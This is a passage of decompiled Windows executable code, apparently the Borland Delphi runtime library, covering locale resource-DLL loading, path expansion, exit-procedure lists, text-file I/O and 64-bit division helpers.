    while ( result != v1[1] && result != v1[2] && result != v1[3] )
    {
      v1 = (_DWORD *)*v1;
      if ( !v1 )
        return result;
    }
    return v1[4];
  }
  return result;
}
// 41C014: using guessed type int dword_41C014;

//----- (0040465C) --------------------------------------------------------
const CHAR *__usercall sub_40465C@<eax>(const CHAR *result@<eax>)
{
  while ( *result && *result != 92 )
    result = CharNextA(result);
  return result;
}

//----- (00404670) --------------------------------------------------------
CHAR *__usercall sub_404670@<eax>(CHAR *a1@<eax>)
{
  HMODULE ModuleHandleA; // eax
  const CHAR *v2; // eax
  const CHAR *v3; // ebx
  int v4; // esi
  const CHAR *v5; // edi
  HANDLE FirstFileA; // eax
  char String2[261]; // [esp+Dh] [ebp-24Fh] BYREF
  char FindFileData[322]; // [esp+112h] [ebp-14Ah] BYREF
  CHAR *v10; // [esp+254h] [ebp-8h]
  LPSTR lpString1; // [esp+258h] [ebp-4h]

  lpString1 = a1;
  v10 = a1;
  ModuleHandleA = GetModuleHandleA("kernel32.dll");
  if ( ModuleHandleA )
  {
    *(_DWORD *)&FindFileData[318] = GetProcAddress(ModuleHandleA, "GetLongPathNameA");
    if ( *(_DWORD *)&FindFileData[318] )
    {
      if ( (*(int (__stdcall **)(LPSTR, char *, int))&FindFileData[318])(lpString1, String2, 261) )
      {
LABEL_16:
        lstrcpyA(lpString1, String2);
        return v10;
      }
    }
  }
  if ( *lpString1 != 92 )
  {
    v3 = lpString1 + 2;
    goto LABEL_10;
  }
  if ( lpString1[1] == 92 )
  {
    v2 = sub_40465C(lpString1 + 2);
    if ( *v2 )
    {
      v3 = sub_40465C(v2 + 1);
      if ( *v3 )
      {
LABEL_10:
        v4 = v3 - lpString1;
        lstrcpynA(String2, lpString1, v3 - lpString1 + 1);
        while ( *v3 )
        {
          v5 = sub_40465C(v3 + 1);
          if ( v4 + v5 - v3 + 1 > 261 )
            return v10;
          lstrcpynA(&String2[v4], v3, v5 - v3 + 1);
          FirstFileA = FindFirstFileA(String2, (LPWIN32_FIND_DATAA)FindFileData);
          if ( FirstFileA == (HANDLE)-1 )
            return v10;
          FindClose(FirstFileA);
          if ( v4 + 1 + lstrlenA(&FindFileData[44]) + 1 > 261 )
            return v10;
          String2[v4] = 92;
          lstrcpyA(&String2[v4 + 1], &FindFileData[44]);
          v4 += lstrlenA(&FindFileData[44]) + 1;
          v3 = v5;
        }
        goto LABEL_16;
      }
    }
  }
  return v10;
}
// 404670: using guessed type CHAR String2[261];

//----- (00404818) --------------------------------------------------------
HMODULE __usercall sub_404818@<eax>(const CHAR *a1@<eax>)
{
  CHAR *v1; // eax
  LCID ThreadLocale; // eax
  HMODULE Library; // esi
  char *i; // ebx
  CHAR *v5; // ebx
  unsigned int ExceptionList; // [esp-Ch] [ebp-134h] BYREF
  LPSTR v8; // [esp-8h] [ebp-130h]
  int v9; // [esp-4h] [ebp-12Ch]
  char Filename[261]; // [esp+Bh] [ebp-11Dh] BYREF
  DWORD cbData; // [esp+110h] [ebp-18h] BYREF
  BYTE Data[5]; // [esp+116h] [ebp-12h] BYREF
  CHAR LCData[5]; // [esp+11Bh] [ebp-Dh] BYREF
  HKEY phkResult; // [esp+120h] [ebp-8h] BYREF
  LPCSTR lpString2; // [esp+124h] [ebp-4h]
  int savedregs; // [esp+128h] [ebp+0h] BYREF

  lpString2 = a1;
  GetModuleFileNameA(0, Filename, 0x105u);
  Data[0] = 0;
  if ( !RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Borland\\Locales", 0, 0xF003Fu, &phkResult)
    || !RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Borland\\Delphi\\Locales", 0, 0xF003Fu, &phkResult) )
  {
    v9 = (int)&savedregs;
    v8 = (LPSTR)&loc_4048E4;
    ExceptionList = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    cbData = 5;
    v1 = sub_404670(Filename);
    if ( RegQueryValueExA(phkResult, v1, 0, 0, Data, &cbData) )
      RegQueryValueExA(phkResult, byte_404A10, 0, 0, Data, &cbData);
    __writefsdword(0, ExceptionList);
    v9 = (int)&loc_4048EB;
    RegCloseKey(phkResult);
  }
  lstrcpyA(Filename, lpString2);
  v9 = 5;
  v8 = LCData;
  ExceptionList = 3;
  ThreadLocale = GetThreadLocale();
  GetLocaleInfoA(ThreadLocale, ExceptionList, v8, v9);
  Library = 0;
  if ( Filename[0] && (LCData[0] || Data[0]) )
  {
    for ( i = &Filename[lstrlenA(Filename)]; *i != 46 && i != Filename; --i )
      ;
    if ( i != Filename )
    {
      v5 = i + 1;
      if ( Data[0] )
      {
        lstrcpyA(v5, (LPCSTR)Data);
        Library = LoadLibraryExA(Filename, 0, 2u);
      }
      if ( !Library )
      {
        if ( LCData[0] )
        {
          lstrcpyA(v5, LCData);
          Library = LoadLibraryExA(Filename, 0, 2u);
          if ( !Library )
          {
            LCData[2] = 0;
            lstrcpyA(v5, LCData);
            return LoadLibraryExA(Filename, 0, 2u);
          }
        }
      }
    }
  }
  return Library;
}
// 404818: using guessed type CHAR Filename[261];

//----- (00404A14) --------------------------------------------------------
// attributes: thunk
_DWORD *__usercall sub_404A14@<eax>(int a1@<eax>)
{
  return sub_404A24(a1);
}

//----- (00404A1C) --------------------------------------------------------
// attributes: thunk
int __usercall sub_404A1C@<eax>(int a1@<eax>)
{
  return sub_404A44(a1);
}

//----- (00404A24) --------------------------------------------------------
_DWORD *__usercall sub_404A24@<eax>(int a1@<eax>)
{
  _DWORD *result; // eax

  result = (_DWORD *)sub_402598(8);
  *result = dword_41C018;
  result[1] = a1;
  dword_41C018 = (int)result;
  return result;
}
// 41C018: using guessed type int dword_41C018;

//----- (00404A44) --------------------------------------------------------
int __usercall sub_404A44@<eax>(int result@<eax>)
{
  int v1; // esi
  _DWORD **v2; // edx
  _DWORD *v3; // ecx

  v1 = dword_41C018;
  if ( dword_41C018 && *(_DWORD *)(dword_41C018 + 4) == result )
  {
    dword_41C018 = *(_DWORD *)dword_41C018;
    return sub_4025B0(v1);
  }
  else
  {
    v2 = (_DWORD **)dword_41C018;
    if ( dword_41C018 )
    {
      while ( 1 )
      {
        v3 = *v2;
        if ( *v2 )
        {
          if ( v3[1] == result )
            break;
        }
        v2 = (_DWORD **)*v2;
        if ( !v2 )
          return result;
      }
      *v2 = (_DWORD *)*v3;
      return sub_4025B0((int)v3);
    }
  }
  return result;
}
// 41C018: using guessed type int dword_41C018;

//----- (00404AA4) --------------------------------------------------------
int __usercall sub_404AA4@<eax>(int a1@<eax>)
{
  int result; // eax
  unsigned int v2[6]; // [esp-Ch] [ebp-20h] BYREF
  int i; // [esp+Ch] [ebp-8h]
  int v4; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v4 = a1;
  result = dword_41C018;
  for ( i = dword_41C018; i; i = *(_DWORD *)i )
  {
    v2[2] = (unsigned int)&savedregs;
    v2[1] = (unsigned int)&loc_404ADF;
    v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v2);
    (*(void (__cdecl **)(unsigned int, void *, int *))(i + 4))(v2[0], &loc_404ADF, &savedregs);
    __writefsdword(0, v2[0]);
    result = *(_DWORD *)i;
  }
  return result;
}
// 41C018: using guessed type int dword_41C018;

//----- (00404B00) --------------------------------------------------------
_DWORD *__usercall sub_404B00@<eax>(_DWORD *result@<eax>)
{
  *result = dword_41C014;
  dword_41C014 = (int)result;
  return result;
}
// 41C014: using guessed type int dword_41C014;

//----- (00404B10) --------------------------------------------------------
_DWORD *__usercall sub_404B10@<eax>(_DWORD *a1@<eax>)
{
  _DWORD *result; // eax
  unsigned int v2[2]; // [esp-Ch] [ebp-10h] BYREF
  int *v3; // [esp-4h] [ebp-8h]
  _DWORD *v4; // [esp+0h] [ebp-4h]
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v4 = a1;
  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_404B74;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  sub_404AA4(a1[1]);
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_404B7B;
  if ( v4 == (_DWORD *)dword_41C014 )
  {
    result = (_DWORD *)*v4;
    dword_41C014 = *v4;
  }
  else
  {
    result = (_DWORD *)dword_41C014;
    if ( dword_41C014 )
    {
      while ( (_DWORD *)*result != v4 )
      {
        result = (_DWORD *)*result;
        if ( !result )
          return result;
      }
      *result = *v4;
    }
  }
  return result;
}
// 41C014: using guessed type int dword_41C014;

//----- (00404B80) --------------------------------------------------------
int **__usercall sub_404B80@<eax>(int **result@<eax>, char **a2@<edx>)
{
  HINSTANCE v3; // eax
  int StringA; // eax
  int *v5; // [esp-Ch] [ebp-414h]
  CHAR Buffer[1032]; // [esp+0h] [ebp-408h] BYREF

  if ( result )
  {
    if ( (int)result[1] >= 0x10000 )
    {
      return (int **)sub_403680(a2, (char *)result[1]);
    }
    else
    {
      v5 = result[1];
      v3 = (HINSTANCE)sub_404638(**result);
      StringA = LoadStringA(v3, (UINT)v5, Buffer, 1024);
      return (int **)sub_4035B0(a2, Buffer, StringA);
    }
  }
  return result;
}

//----- (00404BD8) --------------------------------------------------------
_DWORD *__usercall sub_404BD8@<eax>(_DWORD *result@<eax>)
{
  int v1; // edx
  _DWORD *v2; // [esp-4h] [ebp-4h]

  v1 = *result;
  if ( *result )
  {
    *result = 0;
    v2 = result;
    (*(void (__stdcall **)(int))(*(_DWORD *)v1 + 8))(v1);
    return v2;
  }
  return result;
}

//----- (00404BF0) --------------------------------------------------------
int *__usercall sub_404BF0@<eax>(int *result@<eax>, int a2@<edx>)
{
  int v2; // ecx
  int v3; // [esp-4h] [ebp-4h]

  v2 = *result;
  *result = a2;
  if ( a2 )
  {
    v3 = v2;
    result = (int *)(*(int (__stdcall **)(int))(*(_DWORD *)a2 + 4))(a2);
    v2 = v3;
  }
  if ( v2 )
    return (int *)(*(int (__stdcall **)(int))(*(_DWORD *)v2 + 8))(v2);
  return result;
}

//----- (00404C14) --------------------------------------------------------
DWORD __usercall sub_404C14@<eax>(int a1@<eax>)
{
  DWORD result; // eax

  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 12) = 0;
  if ( ReadFile(*(HANDLE *)a1, *(LPVOID *)(a1 + 20), *(_DWORD *)(a1 + 8), (LPDWORD)(a1 + 16), 0) )
    return 0;
  result = GetLastError();
  if ( result == 109 )
    return 0;
  return result;
}

//----- (00404C40) --------------------------------------------------------
int sub_404C40()
{
  return 0;
}

//----- (00404C43) --------------------------------------------------------
DWORD __usercall sub_404C43@<eax>(int a1@<eax>, DWORD a2@<ecx>)
{
  signed int v2; // edx
  DWORD NumberOfBytesWritten; // [esp+0h] [ebp-4h] BYREF

  NumberOfBytesWritten = a2;
  v2 = *(_DWORD *)(a1 + 12);
  if ( v2 <= 0 )
    return 0;
  *(_DWORD *)(a1 + 12) = 0;
  if ( WriteFile(*(HANDLE *)a1, *(LPCVOID *)(a1 + 20), v2, &NumberOfBytesWritten, 0) )
    return 0;
  else
    return GetLastError();
}

//----- (00404C70) --------------------------------------------------------
DWORD __usercall sub_404C70@<eax>(int a1@<eax>)
{
  DWORD result; // eax
  void *v2; // [esp-4h] [ebp-4h]

  v2 = *(void **)a1;
  *(_DWORD *)(a1 + 4) = 55216;
  result = CloseHandle(v2) - 1;
  if ( result )
    return GetLastError();
  return result;
}

//----- (00404C88) --------------------------------------------------------
DWORD __usercall sub_404C88@<eax>(int a1@<eax>)
{
  int v2; // eax
  int v3; // eax
  DWORD result; // eax
  DWORD v5; // eax
  DWORD v6; // ecx
  HANDLE FileA; // eax
  DWORD v8; // eax
  bool v9; // cf
  LONG v10; // eax
  unsigned int i; // eax
  HANDLE StdHandle; // eax
  DWORD FileType; // eax
  DWORD v14; // [esp-4h] [ebp-8h] BYREF

  *(_DWORD *)(a1 + 12) = 0;
  *(_DWORD *)(a1 + 16) = 0;
  v2 = *(_DWORD *)(a1 + 4) - 55217;
  if ( !v2 )
  {
    v5 = 0x80000000;
    v6 = 3;
    *(_DWORD *)(a1 + 28) = sub_404C14;
    goto LABEL_9;
  }
  v3 = v2 - 1;
  if ( !v3 )
  {
    v5 = 0x40000000;
    v6 = 2;
LABEL_8:
    *(_DWORD *)(a1 + 28) = sub_404C43;
LABEL_9:
    *(_DWORD *)(a1 + 36) = sub_404C70;
    *(_DWORD *)(a1 + 32) = sub_404C40;
    if ( *(_BYTE *)(a1 + 72) )
    {
      FileA = CreateFileA((LPCSTR)(a1 + 72), v5, 1u, 0, v6, 0x80u, 0);
      if ( FileA != (HANDLE)-1 )
      {
        *(_DWORD *)a1 = FileA;
        if ( *(_DWORD *)(a1 + 4) != 55219 )
          goto LABEL_29;
        --*(_DWORD *)(a1 + 4);
        v8 = GetFileSize(*(HANDLE *)a1, 0) + 1;
        if ( v8 )
        {
          v9 = v8 < 0x81;
          v10 = v8 - 129;
          if ( v9 )
            v10 = 0;
          if ( SetFilePointer(*(HANDLE *)a1, v10, 0, 0) != -1 )
          {
            v14 = 0;
            if ( ReadFile(*(HANDLE *)a1, (LPVOID)(a1 + 332), 0x80u, &v14, 0) )
            {
              for ( i = 0; i < v14; ++i )
              {
                if ( *(_BYTE *)(a1 + i + 332) == 26 )
                {
                  if ( SetFilePointer(*(HANDLE *)a1, i - v14, 0, 2u) == -1 || !SetEndOfFile(*(HANDLE *)a1) )
                    goto LABEL_35;
                  break;
                }
              }
LABEL_29:
              if ( *(_DWORD *)(a1 + 4) != 55217 )
              {
                FileType = GetFileType(*(HANDLE *)a1);
                if ( !FileType )
                {
                  CloseHandle(*(HANDLE *)a1);
                  *(_DWORD *)(a1 + 4) = 55216;
                  return 105;
                }
                if ( FileType == 2 )
                  *(_DWORD *)(a1 + 32) = sub_404C43;
              }
              return 0;
            }
          }
        }
      }
    }
    else
    {
      *(_DWORD *)(a1 + 36) = sub_404C40;
      if ( *(_DWORD *)(a1 + 4) == 55218 )
        v14 = -11;
      else
        v14 = -10;
      StdHandle = GetStdHandle(v14);
      if ( StdHandle != (HANDLE)-1 )
      {
        *(_DWORD *)a1 = StdHandle;
        goto LABEL_29;
      }
    }
LABEL_35:
    *(_DWORD *)(a1 + 4) = 55216;
    return GetLastError();
  }
  result = v3 - 1;
  if ( !result )
  {
    v5 = -1073741824;
    v6 = 3;
    goto LABEL_8;
  }
  return result;
}

//----- (00404E16) --------------------------------------------------------
char *__usercall sub_404E16@<eax>(_DWORD *a1@<eax>, char *a2@<edx>)
{
  char *result; // eax
  char v3; // ch
  char v4; // cl
  char *v5; // edx
  char v6; // cl

  a1[5] = a1 + 83;
  *a1 = 0;
  a1[1] = 55216;
  a1[2] = 128;
  a1[3] = 0;
  a1[4] = 0;
  a1[6] = sub_404C88;
  a1[7] = 0;
  a1[8] = 0;
  a1[9] = 0;
  result = (char *)(a1 + 18);
  if ( a2 )
  {
    v3 = -126;
    while ( 1 )
    {
      v4 = *a2;
      v5 = a2 + 1;
      *result++ = v4;
      if ( !v4 )
        break;
      v6 = *v5;
      a2 = v5 + 1;
      *result++ = v6;
      if ( !v6 )
        break;
      if ( !--v3 )
      {
        --result;
        goto LABEL_7;
      }
    }
  }
  else
  {
LABEL_7:
    *result = 0;
  }
  return result;
}

//----- (00404EB8) --------------------------------------------------------
DWORD __userpurge sub_404EB8@<eax>(int a1@<eax>, void *a2@<edx>, int a3@<ecx>, DWORD *a4)
{
  DWORD result; // eax
  int LastError; // eax
  DWORD v7; // [esp-8h] [ebp-10h] BYREF
  int v8; // [esp-4h] [ebp-Ch]

  if ( (unsigned int)(*(_DWORD *)(a1 + 4) - 55217) > 2 )
  {
    LastError = 103;
    goto LABEL_9;
  }
  v8 = a3;
  v7 = 0;
  if ( !ReadFile(*(HANDLE *)a1, a2, a3 * *(_DWORD *)(a1 + 8), &v7, 0) )
  {
    LastError = GetLastError();
    goto LABEL_9;
  }
  result = v7 / *(_DWORD *)(a1 + 8);
  if ( a4 )
  {
    *a4 = result;
    return result;
  }
  if ( result != v8 )
  {
    LastError = 100;
LABEL_9:
    sub_40267C(LastError);
    return 0;
  }
  return result;
}

//----- (00404F1C) --------------------------------------------------------
DWORD __userpurge sub_404F1C@<eax>(int a1@<eax>, const void *a2@<edx>, int a3@<ecx>, DWORD *a4)
{
  DWORD result; // eax
  int LastError; // eax
  DWORD v7; // [esp-8h] [ebp-10h] BYREF
  int v8; // [esp-4h] [ebp-Ch]

  if ( (unsigned int)(*(_DWORD *)(a1 + 4) - 55218) > 1 )
  {
    LastError = 103;
    goto LABEL_9;
  }
  v8 = a3;
  v7 = 0;
  if ( !WriteFile(*(HANDLE *)a1, a2, a3 * *(_DWORD *)(a1 + 8), &v7, 0) )
  {
    LastError = GetLastError();
    goto LABEL_9;
  }
  result = v7 / *(_DWORD *)(a1 + 8);
  if ( a4 )
  {
    *a4 = result;
    return result;
  }
  if ( result != v8 )
  {
    LastError = 101;
LABEL_9:
    sub_40267C(LastError);
    return 0;
  }
  return result;
}

//----- (00404F80) --------------------------------------------------------
int __usercall sub_404F80@<eax>(int result@<eax>)
{
  int v1; // ebx

  v1 = result;
  if ( *(_DWORD *)(result + 4) == 55217 )
  {
LABEL_4:
    result = (*(int (**)(void))(v1 + 36))();
    if ( !result )
      return result;
    return (int)sub_40267C(result);
  }
  if ( (unsigned int)(*(_DWORD *)(result + 4) - 55217) <= 2 )
  {
    result = (*(int (**)(void))(result + 28))();
    if ( result )
      return (int)sub_40267C(result);
    goto LABEL_4;
  }
  if ( (_DWORD *)result != dword_41E048 )
  {
    result = 103;
    return (int)sub_40267C(result);
  }
  return result;
}
// 41E048: using guessed type _DWORD dword_41E048[115];

//----- (00404FBC) --------------------------------------------------------
_DWORD *__usercall sub_404FBC@<eax>(int a1@<eax>, int a2@<edx>)
{
  _DWORD *result; // eax

  if ( *(_DWORD *)(a1 + 4) != 55216 )
  {
    if ( (unsigned int)(*(_DWORD *)(a1 + 4) - 55216) > 3 )
      return sub_40267C(102);
    sub_404F80(a1);
  }
  *(_DWORD *)(a1 + 4) = a2;
  result = (_DWORD *)(*(int (**)(void))(a1 + 24))();
  if ( result )
    return sub_40267C((int)result);
  return result;
}

//----- (00404FFE) --------------------------------------------------------
_DWORD *__usercall sub_404FFE@<eax>(int a1@<eax>)
{
  return sub_404FBC(a1, 55218);
}

//----- (00405005) --------------------------------------------------------
_DWORD *__usercall sub_405005@<eax>(int a1@<eax>)
{
  return sub_404FBC(a1, 55219);
}

//----- (0040500C) --------------------------------------------------------
_DWORD *__usercall sub_40500C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v6; // eax
  DWORD v7; // eax
  DWORD v8; // edx
  DWORD v9; // ecx
  int v10; // edi
  int v11; // edi
  _DWORD *result; // eax
  int LastError; // eax

  if ( *(_DWORD *)(a1 + 4) != 55216 )
  {
    if ( (unsigned int)(*(_DWORD *)(a1 + 4) - 55216) > 3 )
    {
      LastError = 102;
      return sub_40267C(LastError);
    }
    v6 = (*(int (**)(void))(a1 + 36))();
    if ( v6 )
      sub_40267C(v6);
  }
  *(_DWORD *)(a1 + 4) = 55219;
  *(_DWORD *)(a1 + 8) = a2;
  *(_DWORD *)(a1 + 36) = sub_40512E;
  *(_DWORD *)(a1 + 28) = sub_4050B7;
  if ( *(_BYTE *)(a1 + 72) )
  {
    v7 = -1073741824;
    v8 = *(int *)((char *)&dword_4050ED + ((unsigned __int8)(byte_41E042 & 0x70) >> 2));
    v9 = 2;
    v10 = a3 - 3;
    if ( v10 )
    {
      v9 = 3;
      v11 = v10 + 1;
      if ( v11 )
      {
        v7 = 0x40000000;
        *(_DWORD *)(a1 + 4) = 55218;
        if ( v11 != -1 )
        {
          v7 = 0x80000000;
          *(_DWORD *)(a1 + 4) = 55217;
        }
      }
    }
    result = CreateFileA((LPCSTR)(a1 + 72), v7, v8, 0, v9, 0x80u, 0);
  }
  else
  {
    *(_DWORD *)(a1 + 36) = sub_4050B7;
    if ( a3 == 3 )
      result = GetStdHandle(0xFFFFFFF5);
    else
      result = GetStdHandle(0xFFFFFFF6);
  }
  if ( result != (_DWORD *)-1 )
  {
    *(_DWORD *)a1 = result;
    return result;
  }
  *(_DWORD *)(a1 + 4) = 55216;
  LastError = GetLastError();
  return sub_40267C(LastError);
}
// 4050ED: using guessed type int dword_4050ED;
// 41E042: using guessed type char byte_41E042;

//----- (004050B7) --------------------------------------------------------
int sub_4050B7()
{
  return 0;
}

//----- (0040510D) --------------------------------------------------------
_DWORD *__usercall sub_40510D@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v2; // ecx

  v2 = (unsigned __int8)byte_41E042;
  LOBYTE(v2) = byte_41E042 & 3;
  if ( (byte_41E042 & 3) == 3 )
    LOBYTE(v2) = 2;
  return sub_40500C(a1, a2, v2);
}
// 41E042: using guessed type char byte_41E042;

//----- (00405124) --------------------------------------------------------
_DWORD *__usercall sub_405124@<eax>(int a1@<eax>, int a2@<edx>)
{
  return sub_40500C(a1, a2, 3);
}

//----- (0040512E) --------------------------------------------------------
_DWORD *__usercall sub_40512E@<eax>(int a1@<eax>)
{
  int LastError; // eax
  _DWORD *result; // eax
  void *v3; // [esp-4h] [ebp-4h]

  v3 = *(void **)a1;
  *(_DWORD *)(a1 + 4) = 55216;
  result = (_DWORD *)(CloseHandle(v3) - 1);
  if ( result )
  {
    LastError = GetLastError();
    return sub_40267C(LastError);
  }
  return result;
}

//----- (00405144) --------------------------------------------------------
_DWORD *__usercall sub_405144@<eax>(_DWORD *result@<eax>, char *a2@<edx>, signed int a3@<ecx>)
{
  char *v4; // edi
  signed int v5; // edx
  int v6; // eax
  _DWORD *v7; // [esp-Ch] [ebp-14h]
  signed int v8; // [esp-8h] [ebp-10h]
  _DWORD *v9; // [esp-4h] [ebp-Ch]
  signed int v10; // [esp-4h] [ebp-Ch]

  if ( result[1] != 55218 )
  {
    if ( result != dword_41E214 )
      return sub_40267C(105);
    v10 = a3;
    v7 = result;
    sub_404FFE((int)result);
    result = v7;
    a3 = v10;
    if ( v7[1] != 55218 )
      return sub_40267C(105);
  }
  while ( 1 )
  {
    v4 = (char *)(result[3] + result[5]);
    v5 = result[2] - result[3];
    if ( v5 > a3 )
    {
      result[3] += a3;
      qmemcpy(v4, a2, a3);
      return result;
    }
    result[3] = result[2];
    qmemcpy(v4, a2, v5);
    a2 += v5;
    v6 = ((int (__cdecl *)(int, _DWORD *))result[7])(a3 - v5, result);
    if ( v6 )
      break;
    a3 = v8;
    result = v9;
  }
  sub_40267C(v6);
  return v9;
}
// 405173: variable 'v8' is possibly undefined
// 405174: variable 'v9' is possibly undefined
// 41E214: using guessed type _DWORD dword_41E214[115];

//----- (004051AF) --------------------------------------------------------
_DWORD *__usercall sub_4051AF@<eax>(_DWORD *result@<eax>, signed int a2@<edx>)
{
  signed int v3; // [esp-8h] [ebp-8h]
  _DWORD *v4; // [esp-4h] [ebp-4h]

  while ( a2 > 64 )
  {
    v4 = result;
    v3 = a2 - 64;
    sub_405144(result, asc_41C060, 64);
    if ( *((_DWORD *)sub_4059F0() + 1) )
      return v4;
    a2 = v3;
    result = v4;
  }
  if ( a2 > 0 )
    return sub_405144(result, asc_41C060, a2);
  return result;
}

//----- (0040520F) --------------------------------------------------------
int __usercall sub_40520F@<eax>(_DWORD *a1@<eax>)
{
  int v1; // edx
  int result; // eax

  result = (int)sub_405144(a1, asc_41C0A0, 2);
  v1 = *(_DWORD *)(result + 4);
  if ( v1 == 55218 )
  {
    result = (*(int (**)(void))(result + 32))();
    if ( !result )
      return result;
    return (int)sub_40267C(result);
  }
  if ( v1 != 55217 )
  {
    result = 103;
    return (int)sub_40267C(result);
  }
  return result;
}

//----- (0040528C) --------------------------------------------------------
_DWORD *__usercall sub_40528C@<eax>(_DWORD *a1@<eax>, char *a2@<edx>)
{
  unsigned int v3; // kr04_4

  v3 = strlen(a2) + 1;
  sub_4051AF(a1, 1 - v3);
  return sub_405144(a1, a2, v3 - 1);
}

//----- (004052BC) --------------------------------------------------------
int __usercall sub_4052BC@<eax>(int result@<eax>)
{
  if ( result < 0 )
  {
    result = -result;
    if ( result >= 5120 )
    {
      __asm { fldz }
    }
    else
    {
      _EDX = 5 * (result & 0x1F);
      __asm
      {
        fld     tbyte_405360[edx*2]
        fdivp   st(1), st
      }
      result = (unsigned int)result >> 5;
      if ( result )
      {
        if ( (result & 0xF) != 0 )
        {
          _EDX = 5 * (result & 0xF);
          __asm
          {
            fld     tbyte_405496[edx*2]
            fdivp   st(1), st
          }
        }
        result = (unsigned int)result >> 4;
        if ( result )
        {
          result *= 5;
          __asm
          {
            fld     tbyte_40552C[eax*2]
            fdivp   st(1), st
          }
        }
      }
    }
  }
  else if ( result )
  {
    if ( result >= 5120 )
    {
      __asm { fld     tbyte_405356 }
    }
    else
    {
      _EDX = 5 * (result & 0x1F);
      __asm
      {
        fld     tbyte_405360[edx*2]
        fmulp   st(1), st
      }
      result = (unsigned int)result >> 5;
      if ( result )
      {
        if ( (result & 0xF) != 0 )
        {
          _EDX = 5 * (result & 0xF);
          __asm
          {
            fld     tbyte_405496[edx*2]
            fmulp   st(1), st
          }
        }
        result = (unsigned int)result >> 4;
        if ( result )
        {
          result *= 5;
          __asm
          {
            fld     tbyte_40552C[eax*2]
            fmulp   st(1), st
          }
        }
      }
    }
  }
  return result;
}
// 4052D5: inconsistent fpu stack

//----- (00405590) --------------------------------------------------------
int __userpurge sub_405590@<eax>(int a1@<eax>, int a2, int a3)
{
  return a2 * a1;
}

//----- (004055D6) --------------------------------------------------------
int __userpurge sub_4055D6@<eax>(__int64 _RAX@<edx:eax>, unsigned int a2, int a3)
{
  char v3; // di
  unsigned int v4; // ebx
  int v5; // ecx
  unsigned int v6; // ebp
  int v7; // ecx
  char v11; // [esp-4h] [ebp-14h]

  v3 = 0;
  v4 = a2;
  v5 = a3;
  if ( a3 || HIDWORD(_RAX) && a2 )
  {
    if ( _RAX < 0 )
    {
      _RAX = -_RAX;
      v3 = 1;
    }
    if ( a3 < 0 )
    {
      v4 = -a2;
      v5 = -a3 - (a2 != 0);
      v3 ^= 1u;
    }
    v6 = v5;
    v7 = 64;
    v11 = v3;
    _EDI = 0;
    _ESI = 0;
    do
    {
      LODWORD(_RAX) = 2 * _RAX;
      __asm
      {
        rcl     edx, 1
        rcl     esi, 1
        rcl     edi, 1
      }
      if ( _EDI >= v6 && (_EDI > v6 || _ESI >= v4) )
      {
        _EDI = (__PAIR64__(_EDI, _ESI) - __PAIR64__(v6, v4)) >> 32;
        _ESI -= v4;
        LODWORD(_RAX) = _RAX + 1;
      }
      --v7;
    }
    while ( v7 );
    if ( (v11 & 1) != 0 )
      return -_RAX;
  }
  else
  {
    LODWORD(_RAX) = _RAX / (unsigned __int64)a2;
  }
  return _RAX;
}

//----- (00405680) --------------------------------------------------------
int __userpurge sub_405680@<eax>(unsigned __int64 _RAX@<edx:eax>, unsigned __int64 a2)
{
  int v2; // ecx

  if ( HIDWORD(a2) || HIDWORD(_RAX) && (_DWORD)a2 )
  {
    v2 = 64;
    _EDI = 0;
    _ESI = 0;
    do
    {
      LODWORD(_RAX) = 2 * _RAX;
      __asm
      {
        rcl     edx, 1
        rcl     esi, 1
        rcl     edi, 1
      }
      if ( __PAIR64__(_EDI, _ESI) >= a2 )
      {
        _EDI = (__PAIR64__(_EDI, _ESI) - a2) >> 32;
        _ESI -= a2;
        LODWORD(_RAX) = _RAX + 1;
      }
      --v2;
    }
    while ( v2 );
  }
  else
  {
    LODWORD(_RAX) = _RAX / (unsigned int)a2;
  }
  return _RAX;
}

//----- (004056C9) --------------------------------------------------------
unsigned int __userpurge sub_4056C9@<eax>(__int64 _RAX@<edx:eax>, unsigned int a2, int a3)
{
  char v3; // di
  unsigned int v4; // ebx
  int v5; // ecx
  unsigned int v6; // ebp
  int v7; // ecx
  unsigned int result; // eax
  char v11; // [esp-4h] [ebp-14h]

  v3 = 0;
  v4 = a2;
  v5 = a3;
  if ( !a3 && (!HIDWORD(_RAX) || !a2) )
    return _RAX % (unsigned __int64)a2;
  if ( _RAX < 0 )
  {
    _RAX = -_RAX;
    v3 = 1;
  }
  if ( a3 < 0 )
  {
    v4 = -a2;
    v5 = -a3 - (a2 != 0);
  }
  v6 = v5;
  v7 = 64;
  v11 = v3;
  _EDI = 0;
  _ESI = 0;
  do
  {
    LODWORD(_RAX) = 2 * _RAX;
    __asm
    {
      rcl     edx, 1
      rcl     esi, 1
      rcl     edi, 1
    }
    if ( _EDI >= v6 && (_EDI > v6 || _ESI >= v4) )
    {
      _EDI = (__PAIR64__(_EDI, _ESI) - __PAIR64__(v6, v4)) >> 32;
      _ESI -= v4;
      LODWORD(_RAX) = _RAX + 1;
    }
    --v7;
  }
  while ( v7 );
  result = _ESI;
  if ( (v11 & 1) != 0 )
    return -_ESI;
  return result;
}

//----- (00405775) --------------------------------------------------------
unsigned int __userpurge sub_405775@<eax>(unsigned __int64 _RAX@<edx:eax>, unsigned __int64 a2)
{
  int v2; // ecx

  if ( !HIDWORD(a2) && (!HIDWORD(_RAX) || !(_DWORD)a2) )
    return _RAX % (unsigned int)a2;
  v2 = 64;
  _EDI = 0;
  _ESI = 0;
  do
  {
    LODWORD(_RAX) = 2 * _RAX;
    __asm
    {
      rcl     edx, 1
      rcl     esi, 1
      rcl     edi, 1
    }
    if ( __PAIR64__(_EDI, _ESI) >= a2 )
    {
      _EDI = (__PAIR64__(_EDI, _ESI) - a2) >> 32;
      _ESI -= a2;
      LODWORD(_RAX) = _RAX + 1;
    }
    --v2;
  }
  while ( v2 );
  return _ESI;
}

//----- (00405818) --------------------------------------------------------
